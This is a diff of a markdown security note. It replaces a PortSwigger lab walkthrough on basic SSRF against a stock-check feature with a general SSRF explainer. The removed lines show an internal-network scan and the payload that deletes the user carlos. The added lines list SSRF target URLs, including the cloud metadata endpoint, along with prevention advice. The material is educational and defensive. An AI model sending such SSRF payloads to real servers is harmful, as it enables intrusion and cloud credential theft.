@@ -1,177 +1,156 @@
-# Basic SSRF Against Another Back-End System
+# Server-Side Request Forgery (SSRF)
 
 ## Overview
 
-This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application fetches data from a user-supplied URL without proper validation.
+Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to cause the server-side application to make HTTP requests to an arbitrary domain or internal resource.
 
-The attacker can exploit this behavior to make the server send requests to internal systems that are normally inaccessible from the outside network.
+Instead of the attacker directly sending requests to the target system, the vulnerable server performs the request on behalf of the attacker.
 
-In this lab, the vulnerable functionality is a **stock check feature** that retrieves data from an internal service.
-
----
-
-## Vulnerability Type
-
-Server-Side Request Forgery (SSRF)
-
-**OWASP Top 10:** A10 – Server-Side Request Forgery  
-**CWE:** CWE-918
+This can allow attackers to access internal systems that are normally not reachable from the external network.
 
 ---
 
-## Lab Objective
+## How SSRF Works
 
-Use the stock check functionality to:
+Many applications fetch remote resources based on user input.
 
-1. Scan the internal network `192.168.0.X`
-2. Identify the internal **admin interface**
-3. Access the admin endpoint
-4. Delete the user **carlos**
+Examples include:
+
+- fetching stock information
+- retrieving images
+- loading external APIs
+- importing files from URLs
+
+If the application does not properly validate the URL provided by the user, an attacker can manipulate the request to target internal services.
+
+Example vulnerable request:
+
+```
+POST /check-stock HTTP/1.1
+
+stockApi=http://example.com/api
+```
+
+If the application blindly fetches this URL, the attacker can replace it with:
+
+```
+http://127.0.0.1/admin
+```
+
+or
+
+```
+http://192.168.0.10/internal
+```
+
+This causes the server to interact with internal resources.
 
 ---
 
-## Vulnerable Functionality
+## Common SSRF Targets
 
-The application sends a request to the URL provided in the parameter:
+Attackers commonly target:
 
-```
-stockApi
-```
-
-Example request:
+### Internal Services
 
 ```
-POST /product/stock HTTP/2
-Host: vulnerable-lab.com
-
-stockApi=http://example.com
+127.0.0.1
+localhost
+192.168.x.x
+10.x.x.x
+172.16.x.x
 ```
 
-Since the server performs the request on behalf of the user, it allows interaction with internal services.
+These addresses may host internal dashboards or administrative panels.
 
 ---
 
-## Exploitation Steps
+### Cloud Metadata Services
 
-### 1. Intercept the Request
-
-Capture the stock check request using **Burp Suite**.
+In cloud environments such as AWS:
 
 ```
-POST /product/stock HTTP/2
-Host: vulnerable-lab.com
-
-stockApi=http://example.com
+http://169.254.169.254/latest/meta-data/
 ```
+
+This endpoint may expose sensitive information such as:
+
+- access keys
+- IAM credentials
+- instance metadata
 
 ---
 
-### 2. Identify Internal Network Access
+### Internal APIs
 
-Replace the URL with an internal IP address:
+Internal APIs may allow attackers to:
 
-```
-stockApi=http://192.168.0.1:8080
-```
-
-Send the request and observe the response.
-
-If the server responds, it confirms that the application can access internal systems.
+- access private data
+- perform administrative actions
+- delete users
+- change system configurations
 
 ---
 
-### 3. Scan the Internal Network
+## Types of SSRF
 
-Use **Burp Intruder** to scan the internal range.
+### Basic SSRF
 
-Target parameter:
+The attacker can directly view the response from the internal service.
 
-```
-192.168.0.§1§:8080
-```
-
-Payload range:
+Example:
 
 ```
-1 → 254
-```
-
-This allows discovery of active internal services.
-
----
-
-### 4. Identify the Admin Interface
-
-During the scan, one IP returns a different response indicating the presence of the admin panel.
-
-Example discovered endpoint:
-
-```
-http://192.168.0.218:8080/admin
+stockApi=http://127.0.0.1/admin
 ```
 
 ---
 
-### 5. Access the Admin Functionality
+### Blind SSRF
 
-Use the SSRF vulnerability to access the internal admin endpoint.
+The attacker cannot see the response but can trigger requests to external servers.
 
-```
-stockApi=http://192.168.0.218:8080/admin
-```
+Used techniques:
 
----
-
-### 6. Delete the Target User
-
-Trigger the admin delete functionality through SSRF.
-
-```
-stockApi=http://192.168.0.218:8080/admin/delete?username=carlos
-```
-
-This request is executed by the vulnerable server, successfully deleting the user.
+- DNS callbacks
+- Burp Collaborator
+- request timing
 
 ---
 
 ## Impact
 
-Successful exploitation of SSRF can allow attackers to:
+SSRF can lead to severe consequences including:
 
-- Access internal services
-- Bypass network restrictions
-- Interact with admin interfaces
-- Perform internal network scanning
-- Access cloud metadata services
-- Execute administrative actions
+- internal network scanning
+- accessing restricted admin panels
+- reading sensitive internal data
+- cloud credential theft
+- remote command execution in some cases
 
----
-
-## Mitigation
-
-To prevent SSRF vulnerabilities:
-
-- Implement strict **URL validation**
-- Use **allowlists** for trusted domains
-- Block requests to internal IP ranges
-- Disable unnecessary outbound connections
-- Use network segmentation
-- Implement proper request filtering
+Because the requests originate from the server, they often bypass firewalls and access controls.
 
 ---
 
-## Tools Used
+## Prevention
 
-- Burp Suite
-- Burp Intruder
-- Web Security Academy Lab
+To mitigate SSRF vulnerabilities:
+
+- validate and sanitize user-supplied URLs
+- use allowlists for trusted domains
+- block requests to internal IP ranges
+- disable unnecessary outbound requests
+- implement network segmentation
+- use firewall rules to block internal resource access
 
 ---
 
 ## References
 
-OWASP SSRF Guide  
+OWASP SSRF
+
 https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 
-PortSwigger Web Security Academy  
+PortSwigger Web Security Academy
+
 https://portswigger.net/web-security/ssrf
